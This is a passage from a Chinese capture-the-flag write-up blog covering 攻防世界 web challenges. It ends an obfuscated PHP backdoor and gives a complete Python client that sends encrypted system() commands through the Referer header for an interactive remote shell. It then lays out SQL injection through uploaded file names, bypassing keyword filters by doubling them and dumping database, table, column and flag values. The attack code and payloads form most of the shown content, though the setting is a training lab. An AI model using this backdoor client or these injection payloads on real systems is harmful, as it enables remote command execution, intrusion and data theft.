)</span><br><span class="line">                         ),<span class="variable">$k</span>)</span><br><span class="line">                    )</span><br><span class="line">                );</span><br><span class="line">                <span class="variable">$o</span>=<span class="title function_ invoke__">ob_get_contents</span>(); <span class="comment">// 返回输出缓冲区的内容</span></span><br><span class="line">                <span class="title function_ invoke__">ob_end_clean</span>();  <span class="comment">// 清空缓冲区并关闭</span></span><br><span class="line">                <span class="variable">$d</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">x</span>(<span class="title function_ invoke__">gzcompress</span>(<span class="variable">$o</span>),<span class="variable">$k</span>));</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;&lt;<span class="subst">$k</span>&gt;<span class="subst">$d</span>&lt;/<span class="subst">$k</span>&gt;&quot;</span>);</span><br><span class="line">                @<span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看了师傅们的脚本代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="comment"># 注意修改 url , keyh , keyf 等参数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> random import randint,choice</span><br><span class="line"><span class="keyword">from</span> hashlib import md5</span><br><span class="line">import urllib</span><br><span class="line">import <span class="keyword">string</span></span><br><span class="line">import zlib</span><br><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于生成完整的 Accept-Language</span></span><br><span class="line">def <span class="title function_ invoke__">choicePart</span>(seq,amount):</span><br><span class="line">    length = <span class="title function_ invoke__">len</span>(seq)</span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">0</span> <span class="keyword">or</span> length &lt; amount:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;Error Input&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> None</span><br><span class="line">    result = []    <span class="comment"># 结果</span></span><br><span class="line">    indexes = []    <span class="comment"># 索引</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> count &lt; amount:</span><br><span class="line">        i = <span class="title function_ invoke__">randint</span>(<span class="number">0</span>,length-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> not i in indexes:</span><br><span class="line">            indexes.<span class="title function_ invoke__">append</span>(i)</span><br><span class="line">            result.<span class="title function_ invoke__">append</span>(seq[i])</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count == amount:</span><br><span class="line">                <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成随机填充字符串( 由所有 ASCII 字符组成 , 包括不可读的字符 )</span></span><br><span class="line">def <span class="title function_ invoke__">randBytesFlow</span>(amount):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i in <span class="title function_ invoke__">xrange</span>(amount):</span><br><span class="line">        result += <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">randint</span>(<span class="number">0</span>,<span class="number">255</span>))</span><br><span class="line">    <span class="keyword">return</span>  result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成随机填充字符串( 由所有大小写字母组成 )</span></span><br><span class="line">def <span class="title function_ invoke__">randAlpha</span>(amount):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i in <span class="title function_ invoke__">xrange</span>(amount):</span><br><span class="line">        <span class="comment"># choice() 方法返回一个列表，元组或字符串的随机项</span></span><br><span class="line">        <span class="comment"># string.ascii_letters 会生成所有的字母</span></span><br><span class="line">        result += <span class="title function_ invoke__">choice</span>(<span class="keyword">string</span>.ascii_letters)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟 x() 函数 , 循环异或加密</span></span><br><span class="line">def <span class="title function_ invoke__">loopXor</span>(text,key):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    lenKey = <span class="title function_ invoke__">len</span>(key)</span><br><span class="line">    lenTxt = <span class="title function_ invoke__">len</span>(text)</span><br><span class="line">    iTxt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> iTxt &lt; lenTxt:</span><br><span class="line">        iKey = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> iTxt&lt;lenTxt <span class="keyword">and</span> iKey&lt;lenKey:</span><br><span class="line">            result += <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(key[iKey]) ^ <span class="title function_ invoke__">ord</span>(text[iTxt]))</span><br><span class="line">            iTxt += <span class="number">1</span></span><br><span class="line">            iKey += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启 Debug 选项</span></span><br><span class="line">def <span class="title function_ invoke__">debugPrint</span>(msg):</span><br><span class="line">    <span class="keyword">if</span> debugging:</span><br><span class="line">        <span class="keyword">print</span> msg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义基本变量</span></span><br><span class="line">debugging = False    <span class="comment"># 默认关闭 Debug , 可用 True 开启</span></span><br><span class="line">keyh = <span class="string">&quot;42f7&quot;</span>    <span class="comment"># $kh , 需要修改</span></span><br><span class="line">keyf = <span class="string">&quot;e9ac&quot;</span>    <span class="comment"># $kf , 需要修改</span></span><br><span class="line">xorKey = keyh + keyf    <span class="comment"># $k</span></span><br><span class="line">url = <span class="string">&#x27;http://111.200.241.244:59477/hack.php&#x27;</span>    <span class="comment"># 指定 URL  , 需要修改</span></span><br><span class="line">defaultLang = <span class="string">&#x27;zh-CN&#x27;</span>    <span class="comment">#默认Language</span></span><br><span class="line">languages = [<span class="string">&#x27;zh-TW;q=0.%d&#x27;</span>,<span class="string">&#x27;zh-HK;q=0.%d&#x27;</span>,<span class="string">&#x27;en-US;q=0.%d&#x27;</span>,<span class="string">&#x27;en;q=0.%d&#x27;</span>]    <span class="comment">#Accept-Language 模板</span></span><br><span class="line">proxies = None    <span class="comment"># &#123;&#x27;http&#x27;:&#x27;http://127.0.0.1:8080&#x27;&#125; # 代理 , 可用于 BurpSuite 等</span></span><br><span class="line">sess = requests.<span class="title function_ invoke__">Session</span>()    <span class="comment"># 创建一个 SESSION 对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 每次会话会产生一次随机的 Accept-Language</span></span><br><span class="line">langTmp = <span class="title function_ invoke__">choicePart</span>(languages,<span class="number">3</span>)    <span class="comment"># 输出一个列表 , 包含模板中的三种 Accept-language</span></span><br><span class="line">indexes = <span class="title function_ invoke__">sorted</span>(<span class="title function_ invoke__">choicePart</span>(<span class="title function_ invoke__">range</span>(<span class="number">1</span>,<span class="number">10</span>),<span class="number">3</span>), reverse=True)    <span class="comment"># 降序排序输出三个权重值 , 例如 [8,6,4]</span></span><br><span class="line"></span><br><span class="line">acceptLang = [defaultLang]   <span class="comment"># 先添加默认Language</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">xrange</span>(<span class="number">3</span>):</span><br><span class="line">    acceptLang.<span class="title function_ invoke__">append</span>(langTmp[i] % (indexes[i],))    <span class="comment"># 然后循环添加三种 Accept-Language , 并为其添加权重值</span></span><br><span class="line">acceptLangStr = <span class="string">&#x27;,&#x27;</span>.<span class="title function_ invoke__">join</span>(acceptLang)    <span class="comment"># 将多个 Accept-Language 用 &quot; , &quot; 拼接在一起</span></span><br><span class="line"><span class="comment"># acceptLangStr 即为要使用的 Accept-Language</span></span><br><span class="line"><span class="title function_ invoke__">debugPrint</span>(acceptLangStr)</span><br><span class="line"></span><br><span class="line">init2Char = acceptLang[<span class="number">0</span>][<span class="number">0</span>] + acceptLang[<span class="number">1</span>][<span class="number">0</span>]    <span class="comment"># $i</span></span><br><span class="line">md5head = (<span class="title function_ invoke__">md5</span>(init2Char + keyh).<span class="title function_ invoke__">hexdigest</span>())[<span class="number">0</span>:<span class="number">3</span>]    <span class="comment"># $h</span></span><br><span class="line">md5tail = (<span class="title function_ invoke__">md5</span>(init2Char + keyf).<span class="title function_ invoke__">hexdigest</span>())[<span class="number">0</span>:<span class="number">3</span>] + <span class="title function_ invoke__">randAlpha</span>(<span class="title function_ invoke__">randint</span>(<span class="number">3</span>,<span class="number">8</span>))    <span class="comment"># $f + 填充字符串</span></span><br><span class="line"><span class="title function_ invoke__">debugPrint</span>(<span class="string">&#x27;$i is %s&#x27;</span> % (init2Char))</span><br><span class="line"><span class="title function_ invoke__">debugPrint</span>(<span class="string">&#x27;md5 head: %s&#x27;</span> % (md5head,))</span><br><span class="line"><span class="title function_ invoke__">debugPrint</span>(<span class="string">&#x27;md5 tail: %s&#x27;</span> % (md5tail,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 交互式 Shell</span></span><br><span class="line">cmd = <span class="string">&quot;system(&#x27;&quot;</span> + <span class="title function_ invoke__">raw_input</span>(<span class="string">&#x27;shell &gt; &#x27;</span>) + <span class="string">&quot;&#x27;);&quot;</span></span><br><span class="line"><span class="keyword">while</span> cmd != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">    <span class="comment"># 在写入 Payload 前填充一些无关数据</span></span><br><span class="line">    query = []</span><br><span class="line">    <span class="keyword">for</span> i in <span class="title function_ invoke__">xrange</span>(<span class="title function_ invoke__">max</span>(indexes)+<span class="number">1</span>+<span class="title function_ invoke__">randint</span>(<span class="number">0</span>,<span class="number">2</span>)):</span><br><span class="line">        key = <span class="title function_ invoke__">randAlpha</span>(<span class="title function_ invoke__">randint</span>(<span class="number">3</span>,<span class="number">6</span>))</span><br><span class="line">        value = base64.<span class="title function_ invoke__">urlsafe_b64encode</span>(<span class="title function_ invoke__">randBytesFlow</span>(<span class="title function_ invoke__">randint</span>(<span class="number">3</span>,<span class="number">12</span>)))</span><br><span class="line">        query.<span class="title function_ invoke__">append</span>((key, value))    <span class="comment"># 生成无关数据并填充</span></span><br><span class="line">    <span class="title function_ invoke__">debugPrint</span>(<span class="string">&#x27;Before insert payload:&#x27;</span>)</span><br><span class="line">    <span class="title function_ invoke__">debugPrint</span>(query)</span><br><span class="line">    <span class="title function_ invoke__">debugPrint</span>(urllib.<span class="title function_ invoke__">urlencode</span>(query))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对 Payload 进行加密</span></span><br><span class="line">    payload = zlib.<span class="title function_ invoke__">compress</span>(cmd)    <span class="comment"># gzcompress 操作</span></span><br><span class="line">    payload = <span class="title function_ invoke__">loopXor</span>(payload,xorKey)    <span class="comment"># 循环异或运算 , PHP代码中的 x() 函数</span></span><br><span class="line">    payload = base64.<span class="title function_ invoke__">urlsafe_b64encode</span>(payload)    <span class="comment"># base64_encode 编码</span></span><br><span class="line">    payload = md5head + payload    <span class="comment">#    在开头补全$h</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#  对Payload进行修改</span></span><br><span class="line">    cutIndex = <span class="title function_ invoke__">randint</span>(<span class="number">2</span>,<span class="title function_ invoke__">len</span>(payload)-<span class="number">3</span>)</span><br><span class="line">    payloadPieces = (payload[<span class="number">0</span>:cutIndex], payload[cutIndex:], md5tail)</span><br><span class="line">    iPiece = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i in indexes:</span><br><span class="line">        query[i] = (query[i][<span class="number">0</span>],payloadPieces[iPiece])</span><br><span class="line">        iPiece += <span class="number">1</span></span><br><span class="line">    <span class="comment"># 将 Payload 作为查询字符串编码拼接到 Referer 中</span></span><br><span class="line">    referer = url + <span class="string">&#x27;?&#x27;</span> + urllib.<span class="title function_ invoke__">urlencode</span>(query)</span><br><span class="line">    <span class="title function_ invoke__">debugPrint</span>(<span class="string">&#x27;After insert payload, referer is:&#x27;</span>)</span><br><span class="line">    <span class="title function_ invoke__">debugPrint</span>(query)</span><br><span class="line">    <span class="title function_ invoke__">debugPrint</span>(referer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送 HTTP GET 请求</span></span><br><span class="line">    r = sess.<span class="title function_ invoke__">get</span>(url,headers=&#123;<span class="string">&#x27;Accept-Language&#x27;</span>:acceptLangStr,<span class="string">&#x27;Referer&#x27;</span>:referer&#125;,proxies=proxies)</span><br><span class="line">    html = r.text</span><br><span class="line">    <span class="title function_ invoke__">debugPrint</span>(html)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 接收响应数据包</span></span><br><span class="line">    pattern = re.<span class="title function_ invoke__">compile</span>(r<span class="string">&#x27;&lt;%s&gt;(.*)&lt;/%s&gt;&#x27;</span> % (xorKey,xorKey))</span><br><span class="line">    output = pattern.<span class="title function_ invoke__">findall</span>(html)</span><br><span class="line">    <span class="comment"># 如果没有收到响应数据包</span></span><br><span class="line">    <span class="keyword">if</span> <span class="title function_ invoke__">len</span>(output) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;Error,  no backdoor response&#x27;</span></span><br><span class="line">        cmd = <span class="string">&quot;system(&#x27;&quot;</span> + <span class="title function_ invoke__">raw_input</span>(<span class="string">&#x27;shell &gt; &#x27;</span>) + <span class="string">&quot;&#x27;);&quot;</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="comment"># 如果收到响应数据包 , 则对其进行处理</span></span><br><span class="line">    output = output[<span class="number">0</span>]</span><br><span class="line">    <span class="title function_ invoke__">debugPrint</span>(output)</span><br><span class="line">    output = output.<span class="title function_ invoke__">decode</span>(<span class="string">&#x27;base64&#x27;</span>)    <span class="comment"># base64_decode 解码</span></span><br><span class="line">    output = <span class="title function_ invoke__">loopXor</span>(output,xorKey)    <span class="comment"># 循环异或运算</span></span><br><span class="line">    output = zlib.<span class="title function_ invoke__">decompress</span>(output)   <span class="comment"># gzuncompress 运算</span></span><br><span class="line">    <span class="keyword">print</span> output    <span class="comment"># 输出响应信息</span></span><br><span class="line">    cmd = <span class="string">&quot;system(&#x27;&quot;</span> + <span class="title function_ invoke__">raw_input</span>(<span class="string">&#x27;shell &gt; &#x27;</span>) + <span class="string">&quot;&#x27;);&quot;</span></span><br></pre></td></tr></table></figure>

<p>运行就可以拿到flag</p>
<h2 id="58-upload"><a href="#58-upload" class="headerlink" title="58.upload"></a>58.upload</h2><p><img src="https://img-blog.csdnimg.cn/20210924102128438.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA55qu55qu6YCX6YCX6YCX,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>打开，注册</p>
<p>注册好之后,登录跳转页面</p>
<p><img src="https://img-blog.csdnimg.cn/20210924102306955.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA55qu55qu6YCX6YCX6YCX,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>我们先上传一个php文件</p>
<p><img src="https://img-blog.csdnimg.cn/20210924102416461.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA55qu55qu6YCX6YCX6YCX,size_17,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/20210924102434345.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA55qu55qu6YCX6YCX6YCX,size_10,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>显示不正确的文件扩展名,被拦了</p>
<p>用burp抓包改信息</p>
<p>成功上传 但是没有上传路径 只能上传不能利用</p>
<p>我试着上传jpg,png格式的图片文件</p>
<p><img src="https://img-blog.csdnimg.cn/20210924103012211.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA55qu55qu6YCX6YCX6YCX,size_18,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>有文件名回显,这说明文件已经被传到了数据库中,游览器又从数据库中读取了上传的文件,那么这个过程就有可能存在SQL注入,那么将文件名中加入sql语句,尝试burp抓包修改</p>
<p><img src="https://img-blog.csdnimg.cn/20210924103354700.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA55qu55qu6YCX6YCX6YCX,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>可以看出select被过滤了,之后的尝试 from也被过滤了,那么尝试双写绕过</p>
<p><img src="https://img-blog.csdnimg.cn/2021092410360194.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA55qu55qu6YCX6YCX6YCX,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>双写绕过成功</p>
<p>由此可以得出结论肯能存在sql注入</p>
<p>尝试去验证sql注入的存在</p>
<p><img src="https://img-blog.csdnimg.cn/20210924103933472.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA55qu55qu6YCX6YCX6YCX,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/2021092410394980.png" alt="img"></p>
<p> sql语句是执行了,但无法输出执行结果.(可能数据被过滤掉了)</p>
<p>那么尝试将查询结果改为16进制输出</p>
<p><img src="https://img-blog.csdnimg.cn/20210924104215549.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA55qu55qu6YCX6YCX6YCX,size_14,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>输出7765626(7765625 + 1) 用16进制解码字符串为web.</p>
<p>这里有个坑,  插入数据库文件名中如果包括SQL语句，在返回信息时，服务器将对字母进行截断（某些特殊字符也会截断或过滤） 尝试用10进制表示 conv函数(src,from_base,to_base) src是要转换的数据, from_base是原进制, to_base是目标进制.</p>
<p>使用CONV是因为题目过滤了回显有字母的情况，如果出现了字母则后面的内容就不显示，所以需要将16进制的内容转成10进制</p>
<p>构造payload ‘+(selselectect conv(hex(database()),16,10))+’.jpg<br><img src="https://img-blog.csdnimg.cn/20210924105710841.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA55qu55qu6YCX6YCX6YCX,size_19,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>用了科学计数法(估计是数字太长了,这里就需要截断获取数据了</p>
<p> 构造payload：’+(selselectect conv(substr(hex(database()),1,12),16,10))+ ‘.jpg (经过测试发现长度最大为12,超过12 就会返回科学计数法表示)</p>
<p><img src="https://img-blog.csdnimg.cn/20210924110132682.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA55qu55qu6YCX6YCX6YCX,size_13,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>通过解码得到web_up</p>
<p>取下一段’+(selselectect conv(substr(hex(database()),13,12),16,10))+ ‘.jpg</p>
<p><img src="https://img-blog.csdnimg.cn/20210924110240601.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA55qu55qu6YCX6YCX6YCX,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>解码得load拼起来得web_load</p>
<p>上传利用语句注入的文件名在上传文件中进行注入，对substr的截取位置由读者自行调整直至获得完整名称</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1. 库名</span><br><span class="line">file_name&#x27; +(selselectect conv(substr(hex(database()),1,12),16,10))+ &#x27;.jpg</span><br><span class="line"># 得到库名：web_upload</span><br><span class="line"></span><br><span class="line">2. 表名</span><br><span class="line">file_name&#x27;+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema = &#x27;web_upload&#x27; limit 1,1)),1,12),16,10))+&#x27;.jpg</span><br><span class="line"># 得到表名：hello_flag_is_here</span><br><span class="line"></span><br><span class="line">3. 字段</span><br><span class="line">file_name&#x27;+(seleselectct+conv(substr(hex((selselectect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = &#x27;hello_flag_is_here&#x27; limit 1,1)),1,12),16,10))+&#x27;.jpg</span><br><span class="line"># 得到字段名：i_am_flag</span><br><span class="line"></span><br><span class="line">4. 获得数据</span><br><span class="line">file_name&#x27;+(seleselectct+CONV(substr(hex((seselectlect i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+&#x27;.jpg</span><br><span class="line"># 得到flag：!!_@m_Th.e_F!lag</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://jiutu2003.github.io">jiutu2003</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://jiutu2003.github.io/%E5%AE%9E%E6%88%98/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">https://jiutu2003.github.io/%E5%AE%9E%E6%88%98/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://jiutu2003.github.io" target="_blank">jiutu2003</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AE%9E%E6%88%98/">实战</a><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><div class="post_share"><div class="social-share" data-image="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/735eceff91f2a291064f8242242c831b.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/%E5%AE%9E%E6%88%98/Bugku/Bugku/" title="Bugku"><img class="cover" src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/501ea766baf4b2a2c91d2e163d7c4b04.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Bugku</div></div></a></div><div class="next-post pull-right"><a href="/%E5%AE%9E%E6%88%98/ctfshow/ctfshow/" title="ctfshow"><img class="cover" src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/1676127097053.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ctfshow</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/%E5%AE%9E%E6%88%98/ctfshow/ctfshow/" title="ctfshow"><img class="cover" src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/1676127097053.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-23</div><div class="title">ctfshow</div></div></a></div><div><a href="/%E5%AE%9E%E6%88%98/Bugku/Bugku/" title="Bugku"><img class="cover" src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/501ea766baf4b2a2c91d2e163d7c4b04.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-24</div><div class="title">Bugku</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/242ae48778369e7a.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">jiutu2003</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-unseping"><span class="toc-number">1.</span> <span class="toc-text">1.unseping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-file-include"><span class="toc-number">2.</span> <span class="toc-text">2.file_include</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-easyphp"><span class="toc-number">3.</span> <span class="toc-text">3.easyphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-fileinclude"><span class="toc-number">4.</span> <span class="toc-text">4.fileinclude</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-very-easy-sql"><span class="toc-number">5.</span> <span class="toc-text">5.very_easy_sql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-fileinclude"><span class="toc-number">6.</span> <span class="toc-text">6.fileinclude</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-easyupload"><span 